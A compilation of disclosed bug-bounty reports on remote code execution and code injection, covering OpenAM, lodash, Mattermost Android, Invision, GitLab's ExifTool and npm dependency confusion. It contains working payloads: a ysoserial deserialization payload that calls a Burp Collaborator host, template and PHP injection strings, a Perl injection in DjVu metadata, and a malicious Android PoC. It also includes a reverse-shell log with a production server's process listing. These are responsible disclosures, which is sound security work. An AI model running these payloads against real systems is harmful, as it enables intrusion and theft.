GET /██████████=XYZ HTTP/1.1
Host: 127.0.0.1
```
Replace **XYZ** by the payload saved into the payload.txt file. 

The response

```
HTTP/1.1 302 Found
Cache-Control: private
Location: https://127.0.0.1:443/openam/base/AMInvalidURL
Content-Length: 0
```
The HTTP Request sent the collaborator :

███

## Suggested Mitigation/Remediation Actions

---

### [Pre-auth RCE in ForgeRock OpenAM (CVE-2021-35464)](https://hackerone.com/reports/1249456)

- **Report ID:** `1249456`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @fdeleite
- **Bounty:** - usd
- **Disclosed:** 2021-07-29T19:45:04.850Z
- **CVE(s):** CVE-2021-35464

**Vulnerability Information:**

RCE is possible thanks to unsafe Java deserialization in the Jato framework used by OpenAM.

## Impact

An unauthenticated, 3rd-party attacker or adversary can execute remote code
 
### Supporting Material/References
- https://portswigger.net/research/pre-auth-rce-in-forgerock-openam-cve-2021-35464

## System Host(s)
█████

## Affected Product(s) and Version(s)


## CVE Numbers
CVE-2021-35464

## Steps to Reproduce
## Steps To Reproduce

Target domain: █████

First we need to build the payload:
1. Download this jar file 
``wget https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar``

then 
``java -jar ysoserial-master-SNAPSHOT.jar Click1 "curl https://g0h7qcjzwzpzdh2ar6b5f9x3puvkj9.burpcollaborator.net" | (echo -ne \\x00 && cat) | base64 | tr '/+' '_-' | tr -d '=' | tr -d '\n' > payload.txt`` 

You need to change the burp Collaborator id to test it properly. 

The payload is now saved in the payload.txt file. 

Now we need to use the following request:

```
GET /██████████=XYZ HTTP/1.1
Host: 127.0.0.1
```
Replace **XYZ** by the payload saved into the payload.txt file. 

The response

```
HTTP/1.1 302 302
Date: Thu, 01 Jul 2021 18:11:52 GMT
Server: Apache
Set-Cookie: session=expiry=1625163712945691;Max-Age=600;path=/;HttpOnly;Secure;
X-Frame-Options: SAMEORIGIN
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Content-Security-Policy: default-src 'unsafe-inline' 'self'; script-src 'unsafe-eval' 'unsafe-inline' 'self' https://██████████; img-src 'self' https://████████
Cache-Control: no-cache, private
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
Cache-Control: private
Location: https://127.0.0.1:443/sso/base/AMInvalidURL
Content-Length: 0
X-XSS-Protection: 1; mode=block

```
The HTTP Request sent the collaborator :

█████

## Suggested Mitigation/Remediation Actions

---

### [Arbitrary Code Execution via npm misconfiguration – installing internal libraries from the public registry](https://hackerone.com/reports/1043385)

- **Report ID:** `1043385`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** LY Corporation
- **Reporter:** @alexbirsan
- **Bounty:** 11500 usd
- **Disclosed:** 2021-07-05T13:37:07.790Z
- **CVE(s):** -

**Summary (team):**

Due to misconfiguration of the Private NPM registry, a nodejs-based project was able to install a malicious module generated by an attacker instead of a normal module.
If an attacker registers a higher version with the same name as a private module with Global Registry, it will download and install malicious modules from the Global Registry rather than normal packages stored in private registry when building nodejs-based projects.

If the malicious package is installed, the malicious script in the package is executed on the machine where it was downloaded on.

As such, arbitrary code execution could have occurred on the affected hosts.

---

### [Server-side Template Injection in lodash.js ](https://hackerone.com/reports/904672)

- **Report ID:** `904672`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** Node.js third-party modules
- **Reporter:** @zerohex
- **Bounty:** - usd
- **Disclosed:** 2021-06-28T08:43:38.785Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report Server-side Template Injection in lodash.js  (_.template function)
It allows the execution of code on the server

# Module

**module name:** lodash
**version:** 4.17.15
**npm page:** `https://www.npmjs.com/package/lodash`

## Module Description

The Lodash library exported as Node.js modules.

## Module Stats

26,664,631 weekly downloads

# Vulnerability

## Vulnerability Description

The _.template function of the lodash package does not properly validate user-supplied input. 



An application making use of the lodash package may be exploited by an attacker that controls the value of a parameter processed by the _.template function. An attacker can inject code such as Javascript within parenthesis for example `parameter=${JSON.stringify(process.env)}` which will be executed by the server.

## Steps To Reproduce:

**Step 1:** Create a test application that requires the lodash.js library. The application below accepts user-supplied input in the  'name' parameter that is handled by lodash `_.template` function

```
const express = require('express');
const _ = require('lodash');
const escapeHTML = require('escape-html');
const app = express();
app.get('/', (req, res) => {
  res.set('Content-Type', 'text/html');
  const name = req.query.name
  // Create a template from user input
  const compiled = _.template("Hello " + escapeHTML(name) + ".");
  res.status(200).send(compiled());
});

app.listen(8000, () => {
  console.log('POC app listening on port 8000!')
});
```

**Step 2:** Visit the vulnerable application at http://127.0.0.1:8000/?name=Test

**Step 3:** Visit the vulnerable application and enter a payload such as `${JSON.stringify(process.env)}` into the `name` parameter e.g.  http://127.0.0.1:8000/?name=Test${JSON.stringify(process.env)}

## Supporting Material/References:

- OSX 10.15.5
- NODEJS v10.16.0
- NPM v 6.9.0

# Wrap up

- I contacted the maintainer to let them know: [Y/N] N
- I opened an issue in the related repository: [Y/N] N

> Hunter's comments and funny memes goes here

Apologies if I haven't used the ideal terminology or if this is a duplicate.

## Impact

Remote code execution

---

### [Persistant Arbitrary code execution in mattermost android](https://hackerone.com/reports/1115864)

- **Report ID:** `1115864`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** Mattermost
- **Reporter:** @hulkvision_
- **Bounty:** - usd
- **Disclosed:** 2021-06-03T10:40:12.940Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Activity `com.mattermost.share.ShareActivity` is is exported and is designed to allow file sharing from third party application to mattermost android app.
```
 <activity android:theme="@style/AppTheme" android:label="@string/app_name" android:name="com.mattermost.share.ShareActivity" android:taskAffinity="com.mattermost.share" android:launchMode="singleInstance" android:screenOrientation="portrait" android:configChanges="keyboard|keyboardHidden|orientation|screenSize">
            <intent-filter>
                <action android:name="android.intent.action.SEND"/>
                <action android:name="android.intent.action.SEND_MULTIPLE"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <data android:mimeType="*/*"/>
            </intent-filter>
        </activity>
```
I have found path tansversal vulnerability at `com.mattermost.share.RealPathUtil.java`  file 
```
public static String getPathFromSavingTempFile(Context context, final Uri uri) {
             int nameIndex = returnCursor.getColumnIndex(OpenableColumns.DISPLAY_NAME); //get file name here 
            returnCursor.moveToFirst();
            fileName = returnCursor.getString(nameIndex); // "filename=../../lib-main/libyoga.so"
        } catch (Exception e) {
            // just continue to get the filename with the last segment of the path
       }
             String mimeType = getMimeType(uri.getPath());
            tmpFile = new File(cacheDir, fileName);
            tmpFile.createNewFile();  //path transversal here
            ParcelFileDescriptor pfd = context.getContentResolver().openFileDescriptor(uri, "r"); 
            //.../
```
It receives  the value of _display_name from the provider and saved the file with this name, leading to path-traversal.
## Steps To Reproduce:
  1. Install the POC app and open it. F1216351

  On the next launch of the app the malicious code will be executed.In this poc the app will crash on next launch because i was too lazy and  to create a modified version of `libyoga.so`

### POC 
In `MainActivity.java`
```
        Intent intent = new Intent(Intent.ACTION_SEND);
        intent.setClassName("com.mattermost.rn", "com.mattermost.share.ShareActivity");
        intent.putExtra("android.intent.extra.STREAM",Uri.parse("content://com.example.android.pocok/?path=/data/data/com.example.android.pocok/libevil-lib.so&name=../../lib-main/libyoga.so"));
        intent.setType("application/*");
        startActivity(intent);

```
In `EvilContentProvider.java`
```
public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
    MatrixCursor matrixCursor = new MatrixCursor(new String[]{"_display_name"});
    matrixCursor.addRow(new Object[]{uri.getQueryParameter("name")});
    return matrixCursor;
}

public ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException {
    return ParcelFileDescriptor.open(new File(uri.getQueryParameter("path")), ParcelFileDescriptor.MODE_READ_ONLY);
}
```
In `AndroidManifest.xml`
```
<provider android:name=".EvilContentProvider" android:authorities="com.example.android.pocok" android:enabled="true" android:exported="true" />
```

## Impact

Attacker can inject malicious library file in the application which will lead to arbitrary code execution in the app.

---

### [PHP Code Injection through "previewBlock()" method](https://hackerone.com/reports/1092574)

- **Report ID:** `1092574`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** Invision Power Services, Inc.
- **Reporter:** @egix
- **Bounty:** - usd
- **Disclosed:** 2021-05-28T16:50:01.312Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
The vulnerability exists because the `IPS\cms\modules\front\pages\_builder::previewBlock()` method allows to pass arbitrary content to the `IPS\_Theme::runProcessFunction()` method, which will be used in a call to the `eval()` function. This can be exploited to inject and execute arbitrary PHP code.

**Steps To Reproduce:**

- Login as an user with permission to manage the sidebar 
- Browse to the following URL:

```
http://[host]/[ips]/index.php?app=cms&module=pages&controller=builder&do=previewBlock&block_plugin=stats&block_template_use_how=copy&block_plugin_app=core&_sending=block_content&block_content=RCE%0ACONTENT;}}phpinfo();die;/*
```

- This will result in the following PHP code to be passed to the `eval()` function from the `IPS\_Theme::runProcessFunction()` method:

```
namespace IPS\Theme;
class class_content_template_for_block_
{
	function run(  ) {
		$return = '';
		$return .= <<<CONTENT

RCE
CONTENT;}}phpinfo();die;/*
CONTENT;

		return $return;
}}
```

- As a result, the `phpinfo()` function will be executed

## Impact

A malicious user might be able to inject and execute arbitrary PHP code. Successful exploitation of this vulnerability requires an account with permission to manage the sidebar (such as a Moderator or Administrator) and the "cms" application to be enabled.

---

### [RCE when removing metadata with ExifTool](https://hackerone.com/reports/1154542)

- **Report ID:** `1154542`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** GitLab
- **Reporter:** @vakzz
- **Bounty:** 20000 usd
- **Disclosed:** 2021-05-14T20:08:32.101Z
- **CVE(s):** -

**Vulnerability Information:**

### Summary
When uploading image files, GitLab Workhorse passes any files with the extensions [jpg|jpeg|tiff](https://gitlab.com/gitlab-org/gitlab/-/blob/v13.10.2-ee/workhorse/internal/upload/exif/exif.go#L104) through to [ExifTool](https://exiftool.org/) to remove any non-whitelisted tags.

An issue with this is that ExifTool will ignore the file extension and try to determine what the file is based on the content, allowing for any of the supported parsers to be hit instead of just JPEG and TIFF by just renaming the uploaded file.

One of the supported formats is [DjVu](https://github.com/exiftool/exiftool/blob/11.70/lib/Image/ExifTool/DjVu.pm). When parsing the DjVu annotation, the [tokens are evaled](https://github.com/exiftool/exiftool/blob/11.70/lib/Image/ExifTool/DjVu.pm#L233) to "convert C escape sequences". 

There is some validation to try and ensure that everything is properly escaped, but a backslash followed by a newline is correctly handled allowing the quotes to be closed and arbitrary perl inserted and evaluated:

```
(metadata
	(Copyright "\
" . qx{echo vakzz >/tmp/vakzz} . \
" b ") )
```

{F1257008} is an example DjVu file with the above metadata, and {F1257009} is an example that runs a reverse shell.

### Steps to reproduce
1. Download {F1257008} and unzip it
1. Create a new snippet
1. In the description field, hit "Attach a file"
1. Select and uplaod `echo_vakzz.jpg`
1. See that the file `/tmp/vakzz` has been created on the server


Uploading {F1257009} to https://gitlab.com/-/snippets/new resulted in a shell on `web-09-sv-gprd`:

```
Connection from [34.74.90.73] port 12345 [tcp/*] accepted (family 2, sport 17073)
id
uid=500(git) gid=500(git) groups=500(git)
hostname -a
web-09-sv-gprd
ps auxww
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0 185524  5496 ?        Ss    2020  28:31 /sbin/init
root         2  0.0  0.0      0     0 ?        S     2020   1:44 [kthreadd]
root         4  0.0  0.0      0     0 ?        I<    2020   0:00 [kworker/0:0H]
root         6  0.0  0.0      0     0 ?        I<    2020   0:00 [mm_percpu_wq]
root         7  0.0  0.0      0     0 ?        S     2020  22:50 [ksoftirqd/0]
root         8  0.1  0.0      0     0 ?        I     2020 552:25 [rcu_sched]
root         9  0.0  0.0      0     0 ?        I     2020   0:00 [rcu_bh]
root        10  0.0  0.0      0     0 ?        S     2020   1:05 [migration/0]
root        11  0.0  0.0      0     0 ?        S     2020   1:05 [watchdog/0]
root        12  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/0]
root        13  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/1]
root        14  0.0  0.0      0     0 ?        S     2020   1:07 [watchdog/1]
root        15  0.0  0.0      0     0 ?        S     2020   1:03 [migration/1]
root        16  0.0  0.0      0     0 ?        S     2020  20:27 [ksoftirqd/1]
root        18  0.0  0.0      0     0 ?        I<    2020   0:00 [kworker/1:0H]
root        19  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/2]
root        20  0.0  0.0      0     0 ?        S     2020   1:05 [watchdog/2]
root        21  0.0  0.0      0     0 ?        S     2020   1:04 [migration/2]
root        22  0.0  0.0      0     0 ?        S     2020  18:14 [ksoftirqd/2]
root        24  0.0  0.0      0     0 ?        I<    2020   0:00 [kworker/2:0H]
root        25  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/3]
root        26  0.0  0.0      0     0 ?        S     2020   1:07 [watchdog/3]
root        27  0.0  0.0      0     0 ?        S     2020   1:05 [migration/3]
root        28  0.0  0.0      0     0 ?        S     2020  17:57 [ksoftirqd/3]
root        30  0.0  0.0      0     0 ?        I<    2020   0:00 [kworker/3:0H]
root        31  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/4]
root        32  0.0  0.0      0     0 ?        S     2020   1:07 [watchdog/4]
root        33  0.0  0.0      0     0 ?        S     2020   1:05 [migration/4]
root        34  0.0  0.0      0     0 ?        S     2020  17:09 [ksoftirqd/4]
root        36  0.0  0.0      0     0 ?        I<    2020   0:00 [kworker/4:0H]
root        37  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/5]
root        38  0.0  0.0      0     0 ?        S     2020   1:07 [watchdog/5]
root        39  0.0  0.0      0     0 ?        S     2020   1:05 [migration/5]
root        40  0.0  0.0      0     0 ?        S     2020  16:56 [ksoftirqd/5]
root        42  0.0  0.0      0     0 ?        I<    2020   0:00 [kworker/5:0H]
root        43  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/6]
root        44  0.0  0.0      0     0 ?        S     2020   1:05 [watchdog/6]
root        45  0.0  0.0      0     0 ?        S     2020   1:05 [migration/6]
root        46  0.0  0.0      0     0 ?        S     2020  16:33 [ksoftirqd/6]
root        48  0.0  0.0      0     0 ?        I<    2020   0:00 [kworker/6:0H]
root        49  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/7]
root        50  0.0  0.0      0     0 ?        S     2020   1:06 [watchdog/7]
root        51  0.0  0.0      0     0 ?        S     2020   1:05 [migration/7]
root        52  0.0  0.0      0     0 ?        S     2020  16:25 [ksoftirqd/7]
root        54  0.0  0.0      0     0 ?        I<    2020   0:00 [kworker/7:0H]
root        55  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/8]
root        56  0.0  0.0      0     0 ?        S     2020   1:07 [watchdog/8]
root        57  0.0  0.0      0     0 ?        S     2020   1:06 [migration/8]
root        58  0.0  0.0      0     0 ?        S     2020  16:22 [ksoftirqd/8]
root        60  0.0  0.0      0     0 ?        I<    2020   0:00 [kworker/8:0H]
root        61  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/9]
root        62  0.0  0.0      0     0 ?        S     2020   1:05 [watchdog/9]
root        63  0.0  0.0      0     0 ?        S     2020   1:05 [migration/9]
root        64  0.0  0.0      0     0 ?        S     2020  15:52 [ksoftirqd/9]
root        66  0.0  0.0      0     0 ?        I<    2020   0:00 [kworker/9:0H]
root        67  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/10]
root        68  0.0  0.0      0     0 ?        S     2020   1:05 [watchdog/10]
root        69  0.0  0.0      0     0 ?        S     2020   1:06 [migration/10]
root        70  0.0  0.0      0     0 ?        S     2020  16:10 [ksoftirqd/10]
root        72  0.0  0.0      0     0 ?        I<    2020   0:00 [kworker/10:0H]
root        73  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/11]
root        74  0.0  0.0      0     0 ?        S     2020   1:07 [watchdog/11]
root        75  0.0  0.0      0     0 ?        S     2020   1:06 [migration/11]
root        76  0.0  0.0      0     0 ?        S     2020  16:08 [ksoftirqd/11]
root        78  0.0  0.0      0     0 ?        I<    2020   0:00 [kworker/11:0H]
root        79  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/12]
root        80  0.0  0.0      0     0 ?        S     2020   1:09 [watchdog/12]
root        81  0.0  0.0      0     0 ?        S     2020   1:03 [migration/12]
root        82  0.0  0.0      0     0 ?        S     2020  17:07 [ksoftirqd/12]
root        84  0.0  0.0      0     0 ?        I<    2020   0:00 [kworker/12:0H]
root        85  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/13]
root        86  0.0  0.0      0     0 ?        S     2020   1:06 [watchdog/13]
root        87  0.0  0.0      0     0 ?        S     2020   1:06 [migration/13]
root        88  0.0  0.0      0     0 ?        S     2020  16:45 [ksoftirqd/13]
root        90  0.0  0.0      0     0 ?        I<    2020   0:00 [kworker/13:0H]
root        91  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/14]
root        92  0.0  0.0      0     0 ?        S     2020   1:04 [watchdog/14]
root        93  0.0  0.0      0     0 ?        S     2020   1:05 [migration/14]
root        94  0.0  0.0      0     0 ?        S     2020  16:27 [ksoftirqd/14]
root        96  0.0  0.0      0     0 ?        I<    2020   0:00 [kworker/14:0H]
root        97  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/15]
root        98  0.0  0.0      0     0 ?        S     2020   1:07 [watchdog/15]
root        99  0.0  0.0      0     0 ?        S     2020   1:07 [migration/15]
root       100  0.0  0.0      0     0 ?        S     2020  16:35 [ksoftirqd/15]
root       102  0.0  0.0      0     0 ?        I<    2020   0:00 [kworker/15:0H]
root       103  0.0  0.0      0     0 ?        S     2020   0:00 [kdevtmpfs]
root       104  0.0  0.0      0     0 ?        I<    2020   0:00 [netns]
root       105  0.0  0.0      0     0 ?        S     2020   0:00 [rcu_tasks_kthre]
root       106  0.0  0.0      0     0 ?        S     2020   0:00 [kauditd]
root       110  0.0  0.0      0     0 ?        S     2020   0:33 [khungtaskd]
root       111  0.0  0.0      0     0 ?        S     2020   0:11 [oom_reaper]
root       112  0.0  0.0      0     0 ?        I<    2020   0:00 [writeback]
root       113  0.0  0.0      0     0 ?        S     2020   0:51 [kcompactd0]
root       114  0.0  0.0      0     0 ?        SN    2020   0:00 [ksmd]
root       115  0.0  0.0      0     0 ?        SN    2020   3:10 [khugepaged]
root       116  0.0  0.0      0     0 ?        I<    2020   0:00 [crypto]
root       117  0.0  0.0      0     0 ?        I<    2020   0:00 [kintegrityd]
root       118  0.0  0.0      0     0 ?        I<    2020   0:00 [kblockd]
root       119  0.0  0.0      0     0 ?        I<    2020   0:00 [ata_sff]
root       120  0.0  0.0      0     0 ?        I<    2020   0:00 [md]
root       121  0.0  0.0      0     0 ?        I<    2020   0:00 [edac-poller]
root       122  0.0  0.0      0     0 ?        I<    2020   0:00 [devfreq_wq]
root       123  0.0  0.0      0     0 ?        I<    2020   0:00 [watchdogd]
root       127  0.0  0.0      0     0 ?        S     2020  76:51 [kswapd0]
root       128  0.0  0.0      0     0 ?        I<    2020   0:00 [kworker/u33:0]
root       129  0.0  0.0      0     0 ?        S     2020   0:00 [ecryptfs-kthrea]
root       172  0.0  0.0      0     0 ?        I<    2020   0:00 [kthrotld]
root       173  0.0  0.0      0     0 ?        I<    2020   0:00 [acpi_thermal_pm]
root       174  0.0  0.0      0     0 ?        S     2020   0:00 [scsi_eh_0]
root       175  0.0  0.0      0     0 ?        I<    2020   0:00 [scsi_tmf_0]
root       183  0.0  0.0      0     0 ?        I<    2020   0:00 [ipv6_addrconf]
root       195  0.0  0.0      0     0 ?        I<    2020   0:00 [kstrp]
root       212  0.0  0.0      0     0 ?        I<    2020   0:00 [charger_manager]
root       406  0.0  0.0      0     0 ?        I<    2020   0:00 [raid5wq]
root       454  0.0  0.0      0     0 ?        S     2020  10:42 [jbd2/sda1-8]
root       455  0.0  0.0      0     0 ?        I<    2020   0:00 [ext4-rsv-conver]
root       515  0.0  0.0      0     0 ?        I<    2020  11:09 [kworker/12:1H]
root       522  0.0  0.0      0     0 ?        I<    2020   0:00 [iscsi_eh]
root       525  0.0  0.0      0     0 ?        I<    2020   0:00 [ib-comp-wq]
root       526  0.0  0.0      0     0 ?        I<    2020   0:00 [ib-comp-unb-wq]
root       527  0.0  0.0      0     0 ?        I<    2020   0:00 [ib_mcast]
root       528  0.0  0.0      0     0 ?        I<    2020   0:00 [ib_nl_sa_wq]
root       531  0.0  0.0      0     0 ?        I<    2020   0:00 [rdma_cm]
root       542  0.0  0.0      0     0 ?        I<    2020  10:56 [kworker/6:1H]
root       549  0.0  0.0      0     0 ?        I<    2020   0:00 [rpciod]
root       550  0.0  0.0      0     0 ?        I<    2020   0:00 [xprtiod]
root       565  0.0  0.0 102968   824 ?        Ss    2020   0:00 /sbin/lvmetad -f
root       595  0.0  0.0  42604  3368 ?        Ss    2020   2:12 /lib/systemd/systemd-udevd
root       596  0.0  0.0  12204  4680 ?        Ss    2020 451:18 /usr/sbin/haveged --Foreground --verbose=1 -w 1024
root       597  0.0  0.0  97900 38924 ?        Ss    2020 113:30 /lib/systemd/systemd-journald
root       763  0.0  0.0      0     0 ?        S     2020   0:00 [hwrng]
root       798  0.0  0.0      0     0 ?        I<    2020   1:33 [kworker/13:1H]
root       814  0.0  0.0      0     0 ?        S     2020  12:32 [jbd2/sdb-8]
root       815  0.0  0.0      0     0 ?        I<    2020   0:00 [ext4-rsv-conver]
prometh+   969  0.6  0.0 720896 31292 ?        Sl    2020 1997:39 /opt/prometheus/node_exporter/node_exporter --web.listen-address=:9100 --collector.mountstats --collector.nfs --collector.ntp --collector.textfile.directory=/opt/prometheus/node_exporter/metrics --collector.filesystem.ignored-fs-types=^(autofs|binfmt_misc|bpf|cgroup2?|configfs|debugfs|devpts|devtmpfs|fusectl|hugetlbfs|iso9660|mqueue|nfs.*|nsfs|overlay|proc|procfs|pstore|rpc_pipefs|securityfs|selinuxfs|squashfs|sysfs|tracefs)$ --collector.netstat.fields=^(.*_(InErrors|InErrs)|Ip_Forwarding|Ip(6|Ext)_(InOctets|OutOctets)|Icmp6?_(InMsgs|OutMsgs)|TcpExt_(Listen.*|Syncookies.*|TCPSynRetrans)|Tcp_(ActiveOpens|InSegs|OutSegs|OutRsts|PassiveOpens|RetransSegs|CurrEstab)|Udp6?_(InDatagrams|OutDatagrams|NoPorts|RcvbufErrors|SndbufErrors))$
root      1224  0.0  0.0      0     0 ?        I<    2020   1:36 [kworker/10:1H]
root      1230  0.0  0.0  16124  2920 ?        Ss    2020   0:01 /sbin/dhclient -1 -v -pf /run/dhclient.ens4.pid -lf /var/lib/dhcp/dhclient.ens4.leases -I -df /var/lib/dhcp/dhclient6.ens4.leases ens4
root      1386  0.0  0.0   5220   112 ?        Ss    2020   6:09 /sbin/iscsid
root      1389  0.0  0.0   5720  3512 ?        S<Ls  2020  29:44 /sbin/iscsid
root      1407  0.0  0.0 382660   408 ?        Ssl   2020   3:07 /usr/bin/lxcfs /var/lib/lxcfs/
root      1426  0.0  0.0  27728  2320 ?        Ss    2020   3:41 /usr/sbin/cron -f
syslog    1446  0.0  0.0 256392  2112 ?        Ssl   2020  56:37 /usr/sbin/rsyslogd -n
root      1476  0.0  0.0  28628  2648 ?        Ss    2020   0:51 /lib/systemd/systemd-logind
root      1512  0.0  0.0   4396  1208 ?        Ss    2020   0:00 /usr/sbin/acpid
daemon    1525  0.0  0.0  26044  1464 ?        Ss    2020   0:00 /usr/sbin/atd -f
postfix   1570  0.0  0.0  67476  4488 ?        S    12:40   0:00 pickup -l -t fifo -u
root      1593  0.0  0.0   4392   904 ?        Ss    2020   7:41 runsvdir -P /etc/service log: /process HTTP/1.1" 200 153 - -> /process 10.219.1.10 - - [07/Apr/2021:13:13:54 UTC] "GET /process HTTP/1.1" 200 153 - -> /process 10.219.1.9 - - [07/Apr/2021:13:13:58 UTC] "GET /process HTTP/1.1" 200 153 - -> /process 10.219.1.10 - - [07/Apr/2021:13:14:09 UTC] "GET /process HTTP/1.1" 200 153 - -> /process 10.219.1.9 - - [07/Apr/2021:13:14:13 UTC] "GET /process HTTP/1.1" 200 153 - -> /process
git       1594 50.1  2.0 2843912 1351680 ?     Sl   12:40  17:00 puma: cluster worker 0: 7369 [gitlab-puma-worker]
message+  1599  0.0  0.0  43028  3356 ?        Ss    2020   1:36 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
root      1615  0.0  0.0   4240  1200 ?        Ss    2020   0:26 runsv apt_metrics
root      1617  0.0  0.0   4240  1104 ?        Ss    2020   0:03 runsv node_exporter
root      1618  0.0  0.0   4240  1104 ?        Ss    2020   4:24 runsv ntpd_metrics
root      1620  0.0  0.0   4240   380 ?        Ss    2020   0:00 runsv gitlab-monitor
root      1621  0.0  0.0   4240   388 ?        Ss    2020   0:00 runsv mtail
root      1623  0.0  0.0      0     0 ?        I<    2020  15:18 [kworker/0:1H]
root      1624  0.0  0.0   4384   252 ?        S     2020   0:04 svlogd -tt /var/log/mtail
root      1625  0.0  0.0   4384   380 ?        S     2020   0:00 svlogd -tt /var/log/prometheus/node_exporter_apt_metrics
root      1626  0.0  0.0   4384   224 ?        S     2020   0:00 svlogd -tt /var/log/prometheus/node_exporter_ntpd_metrics
root      1627  0.0  0.0   4384   236 ?        S     2020   0:02 svlogd -tt /var/log/prometheus/node_exporter
root      1628  0.0  0.0   4384   240 ?        S     2020   0:00 svlogd -tt /var/log/gitlab-monitor
root      1713  0.0  0.0  13372   908 ?        Ss    2020   0:02 /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog
root      1716  0.0  0.0      0     0 ?        I<    2020   0:46 [kworker/14:1H]
root      1844  0.0  0.0      0     0 ?        I<    2020   0:00 [nfsiod]
root      1850  0.0  0.0 277088  2224 ?        Ssl   2020   0:36 /usr/lib/policykit-1/polkitd --no-debug
root      1878  0.0  0.0      0     0 ?        I<    2020   5:54 [kworker/2:1H]
root      2084  0.0  0.0      0     0 ?        I    Apr06   0:00 [kworker/6:0]
root      2095  0.0  0.0  65512  3084 ?        Ss    2020   0:04 /usr/sbin/sshd -D
root      2102  0.0  0.0      0     0 ?        I<    2020   2:31 [kworker/9:1H]
root      2120  0.0  0.0      0     0 ?        I<    2020   5:08 [kworker/3:1H]
root      2138  0.0  0.0      0     0 ?        I<    2020   0:31 [kworker/15:1H]
root      2146  0.0  0.0      0     0 ?        I<    2020  23:45 [kworker/1:1H]
root      2151  0.0  0.0      0     0 ?        I<    2020   0:40 [kworker/4:1H]
root      2167  0.0  0.0  14656  1372 tty1     Ss+   2020   0:00 /sbin/agetty --noclear tty1 linux
root      2177  0.0  0.0  14472  1556 ttyS0    Ss+   2020   0:00 /sbin/agetty --keep-baud 115200 38400 9600 ttyS0 vt220
ntp       2204  0.0  0.0  40268  2576 ?        Ss    2020  21:06 /usr/sbin/ntpd -p /var/run/ntpd.pid -g -c /var/lib/ntp/ntp.conf.dhcp -u 112:116
root      2270  0.0  0.0  67480 18788 ?        Ss    2020  17:03 /usr/bin/python3 /usr/bin/google_ip_forwarding_daemon
root      2272  0.0  0.0  67220 16368 ?        Ss    2020  10:50 /usr/bin/python3 /usr/bin/google_clock_skew_daemon
root      2402  0.0  0.0  65408  2460 ?        Ss    2020   1:05 /usr/lib/postfix/sbin/master
postfix   2411  0.0  0.0  67640  1988 ?        S     2020   0:23 qmgr -l -t fifo -u
root      2571  0.0  0.0   4392   848 ?        Ss    2020   2:50 runsvdir -P /opt/gitlab/service log: ...........................................................................................................................................................................................................................................................................................................................................................................................................
root      2618  0.0  0.0   4240  1104 ?        Ss    2020   0:01 runsv puma
root      2621  0.0  0.0   4240  1192 ?        Ss    2020   0:05 runsv logrotate
root      2623  0.0  0.0   4240  1144 ?        Ss    2020   0:00 runsv nginx
root      2625  0.0  0.0   4240  1092 ?        Ss    2020   0:01 runsv gitlab-workhorse
gitlab-+  3150  0.0  0.0 754368 26924 ?        Sl   Feb17  35:28 /opt/ruby-2.7.0/bin/ruby /opt/gitlab-monitor/bin/gitlab-mon web -c /opt/gitlab-monitor/config/worker-config.yml
root      3164  0.0  0.0      0     0 ?        I<    2020   0:12 [kworker/11:1H]
root      3211  0.2  0.0      0     0 ?        I    12:42   0:04 [kworker/u32:2]
root      3222  0.0  0.0      0     0 ?        I<    2020   0:15 [kworker/7:1H]
root      3463  0.0  0.0      0     0 ?        I    10:35   0:00 [kworker/5:1]
root      3511  0.0  0.0      0     0 ?        I    11:40   0:00 [kworker/12:0]
root      4032  0.0  0.1 1571276 107596 ?      Ssl   2020 172:34 /opt/prometheus/ebpf_exporter/ebpf_exporter --web.listen-address=:9435 --config.file=/opt/prometheus/ebpf_exporter/config.yml
root      4171  0.0  0.0   4376   640 ?        S    13:12   0:00 sleep 600
root      4302  0.0  0.0      0     0 ?        I<    2020   2:25 [kworker/5:1H]
root      4391  0.0  0.0      0     0 ?        I<    2020   0:14 [kworker/8:1H]
root      4699  0.0  0.0      0     0 ?        I    11:09   0:00 [kworker/13:2]
root      4812  0.0  0.0   4376   672 ?        S    13:13   0:00 sleep 60
root      5375  0.0  0.0   4504   788 ?        Ss   13:13   0:00 /bin/sh /opt/gitlab/embedded/bin/gitlab-logrotate-wrapper
root      5379  0.0  0.0   4376   748 ?        S    13:13   0:00 sleep 600
git       5398 49.7  1.9 2661404 1274712 ?     Sl   12:44  14:43 puma: cluster worker 3: 7369 [gitlab-puma-worker]
